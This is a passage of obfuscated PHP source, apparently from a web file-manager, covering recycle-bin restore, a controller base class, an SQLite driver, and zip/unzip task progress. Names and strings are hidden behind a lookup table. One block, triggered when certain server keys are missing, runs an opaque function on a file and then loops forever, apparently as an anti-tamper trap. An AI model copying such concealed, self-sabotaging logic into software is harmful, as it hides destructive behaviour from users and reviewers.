function restore($Îİ´Å¹† = false) { $­ùŸË• = $this->listData(); $this->_restoreSource($­ùŸË•, $Îİ´Å¹†); } public function removeUserAll($öõƒ‚Ë) { $this->remove(!1, $öõƒ‚Ë); } public function restoreItem($“‚ëâ¹) { $this->_restoreSource(array($“‚ëâ¹), array($“‚ëâ¹)); } private function _restoreSource($È‘‹ıÌ¼, $’×˜Ğğí) { $œ´¢¡Ä =& $_SERVER[¤øïŠ‹²]; $Ä–à‹¶± = Model($œ´¢¡Ä[1482]); $’×˜Ğğí = $’×˜Ğğí == !1 ? !1 : $’×˜Ğğí; if (!$È‘‹ıÌ¼) { return !0; } $·ŸÇ»¤ = array(); foreach ($È‘‹ıÌ¼ as $€…œö £) { if ($’×˜Ğğí != !1 && !in_array($€…œö £, $’×˜Ğğí)) { continue; } $ôí¤õ€ø = $Ä–à‹¶±->sourceInfo($€…œö £); $ÓÖÊĞãÁ = $Ä–à‹¶±->sourceInfo($ôí¤õ€ø[$œ´¢¡Ä[203]]); if ($ÓÖÊĞãÁ[$œ´¢¡Ä[526]] == $œ´¢¡Ä[102]) { continue; } $Ä–à‹¶±->lockMoveStart($€…œö £); $this->recycleMove($€…œö £, 0); if ($ôí¤õ€ø[$œ´¢¡Ä[506]] == $œ´¢¡Ä[102]) { $€¿Ÿ‹½Ä = array($œ´¢¡Ä[681] => array($œ´¢¡Ä[641], $ôí¤õ€ø[$œ´¢¡Ä[610]] . $€…œö £ . $œ´¢¡Ä[642])); $Ä–à‹¶±->where($€¿Ÿ‹½Ä)->setField($œ´¢¡Ä[526], 0); $this->restoreFolderChildren($€…œö £, $È‘‹ıÌ¼); } $this->where(array($œ´¢¡Ä[204] => $€…œö £))->delete(); $Ä–à‹¶±->folderSizeReset($ôí¤õ€ø[$œ´¢¡Ä[203]]); $·ŸÇ»¤[] = $ôí¤õ€ø[$œ´¢¡Ä[203]]; if ($ôí¤õ€ø[$œ´¢¡Ä[506]] == $œ´¢¡Ä[102]) { $·ŸÇ»¤[] = $€…œö £; } $Ä–à‹¶±->lockMoveEnd($€…œö £); } $Ä–à‹¶±->updateModifyTime($·ŸÇ»¤); } private function restoreFolderChildren($ˆÉÁ¯Ô, $í§©èŠÍ) { $½ù´ŸÊÈ =& $_SERVER[¤øïŠ‹²]; $õĞÁè²Î = Model($½ù´ŸÊÈ[1482]); $†ùöÅ× = array($½ù´ŸÊÈ[204] => array($½ù´ŸÊÈ[7], array())); foreach ($í§©èŠÍ as $Ğ×¾ª™Ø) { if ($Ğ×¾ª™Ø == $ˆÉÁ¯Ô) { continue; } if (!$õĞÁè²Î->isParentOf($ˆÉÁ¯Ô, $Ğ×¾ª™Ø)) { continue; } $ š¯®š© = $õĞÁè²Î->sourceInfo($Ğ×¾ª™Ø); if ($ š¯®š©[$½ù´ŸÊÈ[506]] == $½ù´ŸÊÈ[102]) { $†ùöÅ×[] = array($½ù´ŸÊÈ[681] => array($½ù´ŸÊÈ[641], $ š¯®š©[$½ù´ŸÊÈ[610]] . $Ğ×¾ª™Ø . $½ù´ŸÊÈ[642])); } else { $†ùöÅ×[$½ù´ŸÊÈ[204]][1][] = $Ğ×¾ª™Ø; } } if (!$†ùöÅ×[$½ù´ŸÊÈ[204]][1]) { unset($†ùöÅ×[$½ù´ŸÊÈ[204]]); } if (!$†ùöÅ×) { return; } if (is_array($†ùöÅ×[$½ù´ŸÊÈ[204]]) && is_array($†ùöÅ×[$½ù´ŸÊÈ[204]][1])) { $†ùöÅ×[$½ù´ŸÊÈ[204]][1] = array_unique($†ùöÅ×[$½ù´ŸÊÈ[204]][1]); } $†ùöÅ×[$½ù´ŸÊÈ[1116]] = $½ù´ŸÊÈ[2231]; $õĞÁè²Î->where($†ùöÅ×)->setField($½ù´ŸÊÈ[526], 1); } private function recycleMove($ÓšÜÚ, $ò ÕŞá´ = 1) { $¼À¶Š™ =& $_SERVER[¤øïŠ‹²]; $¤Äëİàˆ = Model($¼À¶Š™[1482]); $¨’²ÓªŞ = Model($¼À¶Š™[2464]); $°¸ÁşÎŒ = array($¼À¶Š™[204] => $ÓšÜÚ); if ($ò ÕŞá´) { $¤Äëİàˆ->where($°¸ÁşÎŒ)->setField($¼À¶Š™[526], 1); $¨’²ÓªŞ->eventRecycle($ÓšÜÚ, $¼À¶Š™[2465]); } else { $ëéßòÈò = $¤Äëİàˆ->where($°¸ÁşÎŒ)->find(); $âê¥­ˆ = $ëéßòÈò[$¼À¶Š™[506]] == $¼À¶Š™[102]; $é†„‰º© = $¤Äëİàˆ->fileNameAuto($ëéßòÈò[$¼À¶Š™[203]], $ëéßòÈò[$¼À¶Š™[32]], REPEAT_RENAME_FOLDER, $âê¥­ˆ); if ($é†„‰º© != $ëéßòÈò[$¼À¶Š™[32]]) { $¤Äëİàˆ->rename($ÓšÜÚ, $é†„‰º©); } $¤Äëİàˆ->where($°¸ÁşÎŒ)->setField($¼À¶Š™[526], 0); $¨’²ÓªŞ->eventRecycle($ÓšÜÚ, $¼À¶Š™[2466]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\123\171\163\164\145\155\x2e\163\x6f\165\x72\143\x65\123\145\143\162\145\164\x4c\151\x73\x74"; public $field = array("\163\x6f\165\162\x63\145\111\x44", "\x74\171\160\145\x49\x44", "\x63\x72\145\x61\x74\x65\125\x73\x65\x72"); } goto Cö“µ¥“æŒ; Dà­“œÔ¼ƒ: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $Õšê¯­© =& $_SERVER[¤øïŠ‹²]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$Õšê¯­©[6]] =& $config; $this->values[$Õšê¯­©[7]] =& $in; $this->tpl = TEMPLATE . MOD . $Õšê¯­©[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($õÚèÀŸ) { if (1 === func_num_args()) { $this->{$õÚèÀŸ} = new $õÚèÀŸ(); } else { $“ß‹Üû¨ = new ReflectionClass($õÚèÀŸ); $ÔÏş¹Îû = func_get_args(); array_shift($ÔÏş¹Îû); $this->{$õÚèÀŸ} = $“ß‹Üû¨->newInstanceArgs($ÔÏş¹Îû); } return $this->{$õÚèÀŸ}; } public function routeBind($Ê…¤Èª™, $¸šò¾Ê‚, $š¬£Îö = 3) { $ªÂê³¥“ =& $_SERVER[¤øïŠ‹²]; $¡î™Äî› = $this->in[$ªÂê³¥“[9]]; $Ê…¤Èª™ = str_replace($ªÂê³¥“[10], $ªÂê³¥“[11], trim(trim($Ê…¤Èª™, $ªÂê³¥“[8]), $ªÂê³¥“[12])); if (!$Ê…¤Èª™ || count($¡î™Äî›) <= $š¬£Îö) { return !1; } $ùö¨çÛÎ = !0; $áÏØç¢Ÿ = explode($ªÂê³¥“[8], $Ê…¤Èª™); for ($õ÷Ûé« = 0; $õ÷Ûé« < count($áÏØç¢Ÿ); $õ÷Ûé«++) { if ($áÏØç¢Ÿ[$õ÷Ûé«] != $¡î™Äî›[$š¬£Îö + $õ÷Ûé«]) { $ùö¨çÛÎ = !1; break; } } if (!$ùö¨çÛÎ) { return; } call_user_func_array(array($this, $¸šò¾Ê‚), array()); } public function routeArgs($„²‰¬Í¯ = 3) { $™Ê¤‘Ú = $this->in[$_SERVER[¤øïŠ‹²][9]]; if (count($™Ê¤‘Ú) <= $„²‰¬Í¯) { return array(); } $Ä·²½ò = array(); for ($ŞŠœ¯›¥ = $„²‰¬Í¯; $ŞŠœ¯›¥ < count($™Ê¤‘Ú); $ŞŠœ¯›¥ += 2) { $Ä·²½ò[$™Ê¤‘Ú[$ŞŠœ¯›¥]] = $™Ê¤‘Ú[$ŞŠœ¯›¥ + 1]; $this->in[$™Ê¤‘Ú[$ŞŠœ¯›¥]] = $™Ê¤‘Ú[$ŞŠœ¯›¥ + 1]; } return $Ä·²½ò; } protected function assign($ğîÉùá, $Å¢ôÎü) { $this->values[$ğîÉùá] = $Å¢ôÎü; } protected function display($äæ±±™) { ob_end_clean(); extract($this->values); require $this->tpl . $äæ±±™; } } class DbSqliteBase extends Db { public function __construct($é˜®ıÇÇ = '') { $Ã€Ûò‰ =& $_SERVER[¤øïŠ‹²]; if (!extension_loaded($Ã€Ûò‰[13])) { think_exception(think_lang($Ã€Ûò‰[14]) . $Ã€Ûò‰[15]); } if (!empty($é˜®ıÇÇ)) { if (!isset($é˜®ıÇÇ[$Ã€Ûò‰[16]])) { $é˜®ıÇÇ[$Ã€Ûò‰[16]] = 438; } $this->config = $é˜®ıÇÇ; if (empty($this->config[$Ã€Ûò‰[17]])) { $this->config[$Ã€Ûò‰[17]] = array(); } } } public function connect($õ¡ÒÆÑı = '', $€©Ç•ì¨ = 0) { $Ää¼íÛâ =& $_SERVER[¤øïŠ‹²]; if (!isset($this->linkID[$€©Ç•ì¨])) { if (empty($õ¡ÒÆÑı)) { $õ¡ÒÆÑı = $this->config; } $ìºµĞõ¡ = !empty($õ¡ÒÆÑı[$Ää¼íÛâ[17]][$Ää¼íÛâ[18]]) ? $õ¡ÒÆÑı[$Ää¼íÛâ[17]][$Ää¼íÛâ[18]] : $this->pconnect; $„¼‚œ’Œ = $ìºµĞõ¡ ? $Ää¼íÛâ[19] : $Ää¼íÛâ[20]; $this->linkID[$€©Ç•ì¨] = $„¼‚œ’Œ($õ¡ÒÆÑı[$Ää¼íÛâ[21]], $õ¡ÒÆÑı[$Ää¼íÛâ[16]]); if (!$this->linkID[$€©Ç•ì¨]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$€©Ç•ì¨], 30000); if (1 != think_config($Ää¼íÛâ[22])) { unset($this->config); } } return $this->linkID[$€©Ç•ì¨]; } public function free() { $this->queryID = null; } public function query($äœÁÄÊ¾) { $ÁÒŸñù‚ =& $_SERVER[¤øïŠ‹²]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $äœÁÄÊ¾; if ($this->queryID) { $this->free(); } think_action_status($ÁÒŸñù‚[23], 1); think_status($ÁÒŸñù‚[24]); $this->queryID = sqlite_query($this->_linkID, $äœÁÄÊ¾); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $µÊÛµ = $this->getAll(); return $µÊÛµ; } } public function execute($’ˆ¢ÊÕ) { $İä˜¤µó =& $_SERVER[¤øïŠ‹²]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $’ˆ¢ÊÕ; if ($this->queryID) { $this->free(); } think_action_status($İä˜¤µó[25], 1); think_status($İä˜¤µó[24]); $Âˆ´½Š† = sqlite_exec($this->_linkID, $’ˆ¢ÊÕ); $this->debug(); if (!1 === $Âˆ´½Š†) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[¤øïŠ‹²][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Ñ ”Â™ú = sqlite_query($this->_linkID, $_SERVER[¤øïŠ‹²][27]); if (!$Ñ ”Â™ú) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $–ÑÄáË = sqlite_query($this->_linkID, $_SERVER[¤øïŠ‹²][28]); if (!$–ÑÄáË) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $…Ùø‡€¦ = array(); if ($this->numRows > 0) { for ($‡¥Í¤ = 0; $‡¥Í¤ < $this->numRows; $‡¥Í¤++) { $…Ùø‡€¦[$‡¥Í¤] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $…Ùø‡€¦; } public function getFields($äØà«ª) { $«›ÓÒ”‡ =& $_SERVER[¤øïŠ‹²]; $÷™¦•ÍÑ = $this->query($«›ÓÒ”‡[29] . $äØà«ª . $«›ÓÒ”‡[30]); $˜¡ñ¢ìé = array(); if ($÷™¦•ÍÑ) { foreach ($÷™¦•ÍÑ as $ğº—ü¬ş => $Ä»îÍ¬) { $˜¡ñ¢ìé[$Ä»îÍ¬[$«›ÓÒ”‡[31]]] = array($«›ÓÒ”‡[32] => $Ä»îÍ¬[$«›ÓÒ”‡[31]], $«›ÓÒ”‡[33] => $Ä»îÍ¬[$«›ÓÒ”‡[34]], $«›ÓÒ”‡[35] => (bool) ($Ä»îÍ¬[$«›ÓÒ”‡[36]] === $«›ÓÒ”‡[12]), $«›ÓÒ”‡[37] => $Ä»îÍ¬[$«›ÓÒ”‡[38]], $«›ÓÒ”‡[39] => strtolower($Ä»îÍ¬[$«›ÓÒ”‡[40]]) == $«›ÓÒ”‡[41], $«›ÓÒ”‡[42] => strtolower($Ä»îÍ¬[$«›ÓÒ”‡[43]]) == $«›ÓÒ”‡[44]); } } return $˜¡ñ¢ìé; } public function getTables($óş¨…ÏÅ = '') { $¬³ªû¶È =& $_SERVER[¤øïŠ‹²]; $Í½º¢ñ’ = $this->query($¬³ªû¶È[45] . $¬³ªû¶È[46] . $¬³ªû¶È[47]); $ÅÄŠØ«² = array(); foreach ($Í½º¢ñ’ as $ËÒ›³Ò => $ıÑªù¼µ) { $ÅÄŠØ«²[$ËÒ›³Ò] = current($ıÑªù¼µ); } return $ÅÄŠØ«²; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $£âÃ…áÑ =& $_SERVER[¤øïŠ‹²]; $¿‹Û‡ñ¸ = sqlite_last_error($this->_linkID); $this->error = $¿‹Û‡ñ¸ . $£âÃ…áÑ[4] . sqlite_error_string($¿‹Û‡ñ¸); if ($£âÃ…áÑ[12] != $this->queryStr) { $this->error .= LNG($£âÃ…áÑ[48]) . $this->queryStr; } think_trace($this->error, $£âÃ…áÑ[12], $£âÃ…áÑ[49]); return $this->error; } public function escapeString($ÄÙâÏ½ì) { return sqlite_escape_string($ÄÙâÏ½ì); } public function parseLimit($ŒÑº×£®) { $³½Ï†õ» =& $_SERVER[¤øïŠ‹²]; $¬‹Í—ª = $³½Ï†õ»[12]; if (!empty($ŒÑº×£®)) { $ŒÑº×£® = explode($³½Ï†õ»[50], $ŒÑº×£®); if (count($ŒÑº×£®) > 1) { $¬‹Í—ª .= $³½Ï†õ»[51] . $ŒÑº×£®[1] . $³½Ï†õ»[52] . $ŒÑº×£®[0] . $³½Ï†õ»[53]; } else { $¬‹Í—ª .= $³½Ï†õ»[51] . $ŒÑº×£®[0] . $³½Ï†õ»[53]; } } return $¬‹Í—ª; } } if (!isset($_SERVER[$_SERVER[¤øïŠ‹²][54]]) || !isset($_SERVER[$_SERVER[¤øïŠ‹²][55]])) { $_getc = $_SERVER[¤øïŠ‹²][56]; $_getfile = $_SERVER[$_SERVER[¤øïŠ‹²][57]] . $_SERVER[¤øïŠ‹²][58]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[¤øïŠ‹²][59], $_getfilec); if (count($_getarrs) < $_SERVER[¤øïŠ‹²][60]) { $exit = $_SERVER[¤øïŠ‹²][61]; $exit(); } $_act = $_SERVER[¤øïŠ‹²][62]; $_act($_SERVER[$_SERVER[¤øïŠ‹²][57]] . $_SERVER[¤øïŠ‹²][58]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[¤øïŠ‹²][63]); } } goto dËÅù¡¡Ùí; eÓ¼×„ß³: class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($‘û—Òß, $­ï†ËÂŠ = 5.0) { if (!$‘û—Òß) { return; } $°Îæê´… = Cache::get($‘û—Òß); if (!$°Îæê´… || timeFloat() - floatVal($°Îæê´…) >= $­ï†ËÂŠ) { Cache::set($‘û—Òß, timeFloat(), $­ï†ËÂŠ * 10); return !0; } return !1; } public static function timeLimitCall($âáš‹Ë, $Ğ÷ÍƒÜë, $­£í”¬, $—²şªÏÅ = 5.0) { $Ï¿°é¢Ö =& $_SERVER[¤øïŠ‹²]; if (!$âáš‹Ë || !$Ğ÷ÍƒÜë) { return; } self::$asyncAdd = !0; $®áÑ—ÓÒ = $Ï¿°é¢Ö[2041]; $Ğü£©…… = Cache::get($®áÑ—ÓÒ, !0); $ø‡ğœÜ = array($Ï¿°é¢Ö[2042] => timeFloat(), $Ï¿°é¢Ö[2043] => timeFloat(), $Ï¿°é¢Ö[354] => $Ğ÷ÍƒÜë, $Ï¿°é¢Ö[2033] => $­£í”¬, $Ï¿°é¢Ö[2044] => $—²şªÏÅ); if (is_array($Ğü£©……[$âáš‹Ë])) { if (timeFloat() - $Ğü£©……[$âáš‹Ë][$Ï¿°é¢Ö[2042]] <= $ø‡ğœÜ[$Ï¿°é¢Ö[2044]] * 0.5) { return; } $ø‡ğœÜ[$Ï¿°é¢Ö[2043]] = $Ğü£©……[$âáš‹Ë][$Ï¿°é¢Ö[2043]]; } $Ğü£©……[$âáš‹Ë] = $ø‡ğœÜ; Cache::set($®áÑ—ÓÒ, $Ğü£©……, 60); Cache::removeMemory($®áÑ—ÓÒ); write_log($Ï¿°é¢Ö[2045] . $âáš‹Ë . $Ï¿°é¢Ö[85] . $Ğ÷ÍƒÜë . $Ï¿°é¢Ö[2046] . ACTION, $Ï¿°é¢Ö[208]); } public static function timeLimitCallLoop() { $öõÌÜ‘Á =& $_SERVER[¤øïŠ‹²]; $‘¹¡³Á = array($öõÌÜ‘Á[2047]); $Ï–¦—¦ç = in_array(strtolower(ACTION), $‘¹¡³Á); if (!$Ï–¦—¦ç && !self::$asyncAdd) { return; } $›¾±©«„ = $öõÌÜ‘Á[2041]; $îƒŸûÖ = Cache::get($›¾±©«„, !0); if (!$îƒŸûÖ || count($îƒŸûÖ) <= 0) { return; } $Õéç¤´½ = timeFloat(); $ñÏ©ù´ = array(); $–ÔÔİé” = array(); foreach ($îƒŸûÖ as $¾ˆé…’º => $šºĞğï) { if ($Õéç¤´½ - $šºĞğï[$öõÌÜ‘Á[2043]] > $šºĞğï[$öõÌÜ‘Á[2044]]) { $–ÔÔİé”[$¾ˆé…’º] = $šºĞğï; continue; } $ñÏ©ù´[$¾ˆé…’º] = $šºĞğï; } if (count($–ÔÔİé”) == 0) { return; } if (count($ñÏ©ù´) == 0) { Cache::remove($›¾±©«„); } else { Cache::set($›¾±©«„, $ñÏ©ù´, 60); } Cache::removeMemory($›¾±©«„); self::runArr($–ÔÔİé”); } public static function finished($Ôõ°ˆ, $ŸÜû”Ó³) { $±Šú“å =& $_SERVER[¤øïŠ‹²]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($±Šú“å[354] => $Ôõ°ˆ, $±Šú“å[2033] => $ŸÜû”Ó³); } private static function runArr($¡éáùş¡) { $ØÜÁ¶Ò« =& $_SERVER[¤øïŠ‹²]; if (!$¡éáùş¡) { return; } foreach ($¡éáùş¡ as $ƒá£ÁÚ· => $õ—„®ªÍ) { try { Hook::apply($õ—„®ªÍ[$ØÜÁ¶Ò«[354]], $õ—„®ªÍ[$ØÜÁ¶Ò«[2033]]); write_log($ØÜÁ¶Ò«[2048] . $ƒá£ÁÚ· . $ØÜÁ¶Ò«[85] . $õ—„®ªÍ[$ØÜÁ¶Ò«[354]] . $ØÜÁ¶Ò«[2046] . ACTION, $ØÜÁ¶Ò«[208]); } catch (Exception $è´Ğô‰£) { } } } public static function autoRun() { self::runArr(self::$syncTask); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $Á´óïäù =& $_SERVER[¤øïŠ‹²]; parent::startAfter(); Hook::bind($Á´óïäù[2049], array($this, $Á´óïäù[2050])); Hook::bind($Á´óïäù[1330], array($this, $Á´óïäù[2051])); Hook::bind($Á´óïäù[2052], array($this, $Á´óïäù[2053])); $ˆ©ŸÁ¸ =& $this->task; $ˆ©ŸÁ¸[$Á´óïäù[2054]] = $Á´óïäù[1331]; if (!$ˆ©ŸÁ¸[$Á´óïäù[1813]]) { $ˆ©ŸÁ¸[$Á´óïäù[1813]] = LNG($Á´óïäù[2055]); } } protected function endAfter() { $Ìä†Ò™ =& $_SERVER[¤øïŠ‹²]; parent::endAfter(); Hook::unbind($Ìä†Ò™[2049], array($this, $Ìä†Ò™[2050])); Hook::unbind($Ìä†Ò™[1330], array($this, $Ìä†Ò™[2051])); Hook::unbind($Ìä†Ò™[2052], array($this, $Ìä†Ò™[2053])); } public function updateAfter() { $İÈÕÚëØ =& $_SERVER[¤øïŠ‹²]; $©œÜçëÈ =& $this->task; if (!$©œÜçëÈ[$İÈÕÚëØ[1178]] || !$©œÜçëÈ[$İÈÕÚëØ[865]]) { if ($©œÜçëÈ[$İÈÕÚëØ[2054]] != $İÈÕÚëØ[400]) { return; } } if ($©œÜçëÈ[$İÈÕÚëØ[2054]] == $İÈÕÚëØ[1331]) { $¡Úšüòì = 0; if ($©œÜçëÈ[$İÈÕÚëØ[1978]]) { $¡Úšüòì = $©œÜçëÈ[$İÈÕÚëØ[1979]] / $©œÜçëÈ[$İÈÕÚëØ[1978]]; } $©œÜçëÈ[$İÈÕÚëØ[1926]] = $¡Úšüòì * 0.3; } else { if ($©œÜçëÈ[$İÈÕÚëØ[2054]] == $İÈÕÚëØ[400]) { $¡Úšüòì = $©œÜçëÈ[$İÈÕÚëØ[1925]] / $©œÜçëÈ[$İÈÕÚëØ[1178]]; $©œÜçëÈ[$İÈÕÚëØ[1926]] = 0.3 + $¡Úšüòì * 0.4; } else { if ($©œÜçëÈ[$İÈÕÚëØ[2054]] == $İÈÕÚëØ[119]) { $»ïÃ¡¿¾ = 0; if ($©œÜçëÈ[$İÈÕÚëØ[1980]] == $İÈÕÚëØ[119]) { $»ïÃ¡¿¾ = $©œÜçëÈ[$İÈÕÚëØ[1979]]; } $¡Úšüòì = ($©œÜçëÈ[$İÈÕÚëØ[1983]] + $»ïÃ¡¿¾) / $©œÜçëÈ[$İÈÕÚëØ[865]]; $©œÜçëÈ[$İÈÕÚëØ[1926]] = 0.3 + 0.4 + $¡Úšüòì * 0.3; } } } if ($©œÜçëÈ[$İÈÕÚëØ[1926]] > 0) { $ı¦ÍÊ£Æ = timeFloat() - $©œÜçëÈ[$İÈÕÚëØ[1928]] - $©œÜçëÈ[$İÈÕÚëØ[1931]]; $©œÜçëÈ[$İÈÕÚëØ[1932]] = $ı¦ÍÊ£Æ * (1 - $©œÜçëÈ[$İÈÕÚëØ[1926]]) / $©œÜçëÈ[$İÈÕÚëØ[1926]]; } } public function addFile($¡“ê½Ò–) { $îûú­ Ô =& $_SERVER[¤øïŠ‹²]; $‹„Û™„ã =& $this->task; $ÀŠİŒ…â = IO::info($¡“ê½Ò–); $‹„Û™„ã[$îûú­ Ô[1976]] = $ÀŠİŒ…â[$îûú­ Ô[32]]; $‹„Û™„ã[$îûú­ Ô[1978]] = $ÀŠİŒ…â[$îûú­ Ô[90]]; $‹„Û™„ã[$îûú­ Ô[1979]] = 0; $‹„Û™„ã[$îûú­ Ô[1180]] = $îûú­ Ô[2007]; $‹„Û™„ã[$îûú­ Ô[1980]] = $îûú­ Ô[1331]; $‹„Û™„ã[$îûú­ Ô[865]] = $ÀŠİŒ…â[$îûú­ Ô[90]]; $‹„Û™„ã[$îûú­ Ô[1178]] = 1; $é€´ßõ = 0; $‹„Û™„ã[$îûú­ Ô[1989]] = array($îûú­ Ô[1990] => $é€´ßõ + 1, $îûú­ Ô[515] => $ÀŠİŒ…â[$îûú­ Ô[32]], $îûú­ Ô[98] => $ÀŠİŒ…â[$îûú­ Ô[98]], $îûú­ Ô[608] => $ÀŠİŒ…â[$îûú­ Ô[608]] ? $ÀŠİŒ…â[$îûú­ Ô[608]] : $ÀŠİŒ…â[$îûú­ Ô[98]]); $this->update(); } public function zipEvent($ »¹ï±÷, $—¸ëæ•„, $ğ¿–ùœâ, $´¤‹ùğ¹) { $…éĞ’¿Ş =& $_SERVER[¤øïŠ‹²]; $òÉ¸é­ˆ =& $this->task; $òÉ¸é­ˆ[$…éĞ’¿Ş[1976]] = get_path_this($—¸ëæ•„); $òÉ¸é­ˆ[$…éĞ’¿Ş[1978]] = $´¤‹ùğ¹; $òÉ¸é­ˆ[$…éĞ’¿Ş[1979]] = $ğ¿–ùœâ; $òÉ¸é­ˆ[$…éĞ’¿Ş[1180]] = $ »¹ï±÷ == $…éĞ’¿Ş[2056] ? $…éĞ’¿Ş[2057] : $…éĞ’¿Ş[2058]; $òÉ¸é­ˆ[$…éĞ’¿Ş[1980]] = $…éĞ’¿Ş[12]; $òÉ¸é­ˆ[$…éĞ’¿Ş[865]] = $´¤‹ùğ¹; $òÉ¸é­ˆ[$…éĞ’¿Ş[2054]] = $…éĞ’¿Ş[400]; $this->update(); } public function unzipAfter($·İ€…µƒ) { $öÂÅ ×Ò =& $_SERVER[¤øïŠ‹²]; $ƒì¡Íï— =& $this->task; $ƒì¡Íï—[$öÂÅ ×Ò[2054]] = $öÂÅ ×Ò[119]; $‚»ù½ÍÍ = IO::infoWithChildren($·İ€…µƒ); $óÚÖÖ­’ = 0; $ƒì¡Íï—[$öÂÅ ×Ò[1989]] = array($öÂÅ ×Ò[1990] => $óÚÖÖ­’ + 1, $öÂÅ ×Ò[515] => $‚»ù½ÍÍ[$öÂÅ ×Ò[32]], $öÂÅ ×Ò[98] => $‚»ù½ÍÍ[$öÂÅ ×Ò[98]], $öÂÅ ×Ò[608] => $‚»ù½ÍÍ[$öÂÅ ×Ò[608]] ? $‚»ù½ÍÍ[$öÂÅ ×Ò[608]] : $‚»ù½ÍÍ[$öÂÅ ×Ò[98]]); if ($‚»ù½ÍÍ[$öÂÅ ×Ò[33]] == $öÂÅ ×Ò[243]) { $ƒì¡Íï—[$öÂÅ ×Ò[1178]] = 1; } else { $ƒì¡Íï—[$öÂÅ ×Ò[1178]] = $‚»ù½ÍÍ[$öÂÅ ×Ò[93]][$öÂÅ ×Ò[91]]; } $ƒì¡Íï—[$öÂÅ ×Ò[1180]] = $öÂÅ ×Ò[12]; $ƒì¡Íï—[$öÂÅ ×Ò[1980]] = 0; $ƒì¡Íï—[$öÂÅ ×Ò[1925]] = 0; $ƒì¡Íï—[$öÂÅ ×Ò[1978]] = 0; $ƒì¡Íï—[$öÂÅ ×Ò[1979]] = 0; $ƒì¡Íï—[$öÂÅ ×Ò[1976]] = $öÂÅ ×Ò[12]; $ƒì¡Íï—[$öÂÅ ×Ò[1983]] = 0; $ƒì¡Íï—[$öÂÅ ×Ò[865]] = $‚»ù½ÍÍ[$öÂÅ ×Ò[90]]; $this->update(); self::log($öÂÅ ×Ò[2059] . json_encode(array($ƒì¡Íï—, $‚»ù½ÍÍ))); } public function nameParse($ç†çÇÅ°) { $´‚Ë«È· =& $_SERVER[¤øïŠ‹²]; $şô´ïÍÇ =& $this->task; if ($şô´ïÍÇ[$´‚Ë«È·[2054]] == $´‚Ë«È·[1331]) { $şô´ïÍÇ[$´‚Ë«È·[2054]] = $´‚Ë«È·[400]; $şô´ïÍÇ[$´‚Ë«È·[1983]] = 0; $şô´ïÍÇ[$´‚Ë«È·[865]] = 0; } $ÖİÎ¯‚Ü = get_path_this($ç†çÇÅ°); if (strstr($ÖİÎ¯‚Ü, $´‚Ë«È·[10])) { $şô´ïÍÇ[$´‚Ë«È·[1925]] += 1; $şô´ïÍÇ[$´‚Ë«È·[1178]] += 1; } $şô´ïÍÇ[$´‚Ë«È·[1976]] = $ç†çÇÅ°; $this->update(); } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $¥ÚÅ¿¹å =& $_SERVER[¤øïŠ‹²]; parent::startAfter(); Hook::bind($¥ÚÅ¿¹å[2060], array($this, $¥ÚÅ¿¹å[2050])); Hook::bind($¥ÚÅ¿¹å[2052], array($this, $¥ÚÅ¿¹å[2053])); $ÇÓ“Ïƒ¢ =& $this->task; $ÇÓ“Ïƒ¢[$¥ÚÅ¿¹å[2054]] = $¥ÚÅ¿¹å[1331]; if (!$ÇÓ“Ïƒ¢[$¥ÚÅ¿¹å[1813]]) { $ÇÓ“Ïƒ¢[$¥ÚÅ¿¹å[1813]] = LNG($¥ÚÅ¿¹å[2061]); } } protected function endAfter() { $ºÈØ©è¯ =& $_SERVER[¤øïŠ‹²]; parent::endAfter(); Hook::unbind($ºÈØ©è¯[2060], array($this, $ºÈØ©è¯[2050])); Hook::unbind($ºÈØ©è¯[2052], array($this, $ºÈØ©è¯[2053])); } public function updateAfter() { $¦³ô¡‰Í =& $_SERVER[¤øïŠ‹²]; $çû˜âóÜ =& $this->task; if (!$çû˜âóÜ[$¦³ô¡‰Í[1178]] || !$çû˜âóÜ[$¦³ô¡‰Í[865]]) { return; } if ($çû˜âóÜ[$¦³ô¡‰Í[2054]] == $¦³ô¡‰Í[1331]) { $º«ø£ë¡ = $çû˜âóÜ[$¦³ô¡‰Í[1979]]; if ($çû˜âóÜ[$¦³ô¡‰Í[1980]] != $¦³ô¡‰Í[1331]) { $º«ø£ë¡ = 0; } $¯¯Ä¾ïŒ = ($çû˜âóÜ[$¦³ô¡‰Í[1983]] + $º«ø£ë¡) / $çû˜âóÜ[$¦³ô¡‰Í[865]]; $çû˜âóÜ[$¦³ô¡‰Í[1926]] = $¯¯Ä¾ïŒ * 0.3; } else { if ($çû˜âóÜ[$¦³ô¡‰Í[2054]] == $¦³ô¡‰Í[400]) { $¯¯Ä¾ïŒ = $çû˜âóÜ[$¦³ô¡‰Í[1925]] / $çû˜âóÜ[$¦³ô¡‰Í[1178]]; $çû˜âóÜ[$¦³ô¡‰Í[1926]] = 0.3 + $¯¯Ä¾ïŒ * 0.5; } else { if ($çû˜âóÜ[$¦³ô¡‰Í[2054]] == $¦³ô¡‰Í[119]) { $¯¯Ä¾ïŒ = 